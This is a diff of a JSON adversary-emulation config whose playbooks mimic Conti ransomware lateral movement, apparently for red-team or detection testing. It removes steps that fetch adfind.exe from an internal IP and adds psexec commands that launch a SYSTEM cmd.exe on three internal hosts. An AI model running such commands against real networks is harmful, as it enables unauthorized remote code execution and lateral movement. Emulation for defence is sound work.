@@ -3,7 +3,7 @@
   "sleep": 5,
   "playbooks": [
     {
-      "name": "Conti Ransomware Emulation - Remote code execution with WMI",
+      "name": "Conti Ransomware Emulation - Lateral Movement -  Remote code execution with WMI",
       "enabled": true,
       "task_sleep": 3,
       "tasks": [
@@ -19,7 +19,7 @@
       ]
     },
     {
-      "name": "Conti Ransomware Emulation - Remote code execution with PsExec",
+      "name": "Conti Ransomware Emulation - Lateral Movement - Remote code execution with PsExec",
       "enabled": true,
       "task_sleep": 3,
       "tasks": [
@@ -31,25 +31,21 @@
           "task_sleep": 5
         },
         {
-          "technique_id": "T1105",
-          "technique_name": "Ingress Tool Transfer",
-          "variation": 1,
-          "url": "http://10.0.1.14/adfind.exe",
-          "task_sleep": 5
-        },
-        {
-          "technique_id": "T1570",
-          "technique_name": "Lateral Tool Transfer",
-          "host_target_type": 2,
-          "host_target_total": 5,
-          "local_path": "adfind.exe",
-          "remote_path": "Windows\\Temp"
+          "technique_id": "T1059.003",
+          "command": "psexec.exe -accepteula -d -s \\\\10.0.1.18 C:\\windows\\system32\\cmd.exe",
+          "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
         },
         {
           "technique_id": "T1059.003",
-          "command": "psexec.exe -accepteula -d -s \\\\10.0.1.14 C:\\windows\\Temp\\adfind.exe",
+          "command": "psexec.exe -accepteula -d -s \\\\10.0.1.19 C:\\windows\\system32\\cmd.exe",
+          "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+        },
+        {
+          "technique_id": "T1059.003",
+          "command": "psexec.exe -accepteula -d -s \\\\10.0.1.20 C:\\windows\\system32\\cmd.exe",
           "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
         }
+        
       ]
     }
   ]
